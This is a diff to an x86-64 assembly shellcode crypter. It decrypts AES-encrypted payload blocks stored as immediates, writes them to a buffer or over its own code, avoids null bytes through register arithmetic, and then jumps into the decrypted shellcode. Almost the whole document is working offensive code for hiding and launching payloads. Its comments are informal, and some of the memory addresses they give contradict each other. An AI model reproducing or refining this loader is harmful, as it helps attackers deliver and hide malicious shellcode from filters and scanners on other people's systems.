@@ -1,5 +1,9 @@
 #$ as shellcode.s -o shellcode.o
 #$ ld shellcode.o -o shellcode
+.data
+	.comm shellcode 32
+# an unaligned buffer for the decrypted shellcode since, it's impossible (at least, I don't know how) to store an arbitrary length in the registers using XMM, stack won't work either, as well as rewriting assembly it-self
+# it can cause some problems with memory randomization, thus not a very good idea
 
 .globl _start
 _start:
@@ -135,17 +139,15 @@ aesdec     %xmm6,  %xmm0
 aesdeclast %xmm5,  %xmm0
 
 # finally, we can move the decrypted block to the memory
-# the Linux location is 0x00600078 and since it contains null bytes, we dont want this for our shellcode, so we will juste make a subtraction of some non null byted values, in order to obtain the address we need
-movabs $0xffffffffff599999, %rsi
-#movabs $0xfffffffffef99689, %rax
-movabs $0xffffffffff599921, %rax
-sub %rax, %rsi
-mov %rsi, %rbx
-# we will save our pointer in RBX and not RAX, in order not to have zeroes
+# the Linux location is 0x00600300, but will be 0x00600310 (not 0x00600078 though) and since it contains null bytes, we dont want this for our shellcode, so we will juste make a subtraction of some non null byted values, in order to obtain the address we need
+movabs $0xffffffffff599999, %rdx
+movabs $0xfffffffffef99689, %rsi
+#movabs $0xffffffffff199921, %rsi
+sub %rsi, %rdx
+mov %rdx, %rsi
+# we will save our pointer in RDX, in order not to have zeroes
 movaps %xmm0, (%rsi)
-# GCC's address could be 0x600900 or 0x6001280 and it could be obtained directly from RDX, so for the morpher we will save the pointer from RDX to RSI, without any additional mathematical operation
-# mov %rdx, %rsi
-# movaps %xmm0, (%rsi)
+# GCC's address could be 0x600900 or 0x6001280 and it could be obtained directly from RDX, so for the morpher we will save the pointer from RDX to RSI, without any additional mathematical operation, thereby the shellcode will rewrite it-self
     
 # second block decryption juste like the first-one
 movabs $0xbe28868e0cb06609, %r14
@@ -167,12 +169,9 @@ aesdec     %xmm7,  %xmm0
 aesdec     %xmm6,  %xmm0
 aesdeclast %xmm5,  %xmm0
 
-# move it after already written 16 bytes, using RBX, so we are not limited by the length (16 will be constant, so no zeroes)
-add $16, %rbx
-movaps %xmm0, (%rbx)
-# however, in the morpher we will use RDX since, it contains the shellcode's address, thereby the shellcode will rewrite it-self
-# add $16, %rdx
-# movaps %xmm0, (%rdx)
+# move it after already written 16 bytes, using RDX, so we are not limited by the length (16 will be constant, so no zeroes)
+add $16, %rdx
+movaps %xmm0, (%rdx)
 # "Release The Kraken!" I mean, shellcode
 jmpq *%rsi
 
